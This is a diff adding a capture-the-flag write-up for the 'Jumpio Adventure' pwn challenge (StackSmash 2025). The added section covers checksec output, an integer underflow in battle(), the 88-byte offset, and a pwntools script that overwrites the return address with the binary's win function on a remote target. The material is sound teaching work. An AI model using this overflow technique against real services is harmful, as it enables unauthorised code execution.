@@ -144,6 +144,40 @@ The Man, the Myth, the Legend! The grand winner of the race wants the whole worl
 
 The just read it with correct endianness and convert to ASCII.
 
+# Jumpio Adventure (StackSmash 2025)
+
+```bash
+└─$ file jumpios_adventure         
+jumpios_adventure: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1c58b6bcb029fedf9a75cdafe0842ecfd204fb4b, for GNU/Linux 3.2.0, not stripped
+```
+```bash
+└─$ checksec --file=jumpios_adventure
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY  Fortified  Fortifiable  FILE
+Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   63 Symbols        No     0          4            jumpios_adventure
+```
+In Ghidra, I analyzed the `battle()` function there is a possible integer overflow here in `attack` variable since
+`attack = attack - 2000`, and `attack` is `unsigned integer` (setting this number too low at first causes the overflow).
+Input sequence to reach this part of the code: 1, 4, 5, 1.
+Overflowing it with `pwn.cyclic` pattern to find the correct offsets for return address I get 88 bytes. (`cyclic -l <INPUT>`)
+```python
+import sys
+from pwn import *
+
+p = remote(sys.argv[1], sys.argv[2])
+e = ELF("./jumpios_adventure")
+win_add = p64(e.sym.win)
+
+#p = process("./jumpios_adventure")
+
+p.sendlineafter(b'> ', b'1')
+p.sendlineafter(b'> ', b'4')
+p.sendlineafter(b'> ', b'5')
+p.sendlineafter(b'> ', b'1')
+p.sendlineafter(b"name: ", b'A' * 88 + win_add) 
+ 
+print(p.interactive())
+```
+
 
 
 
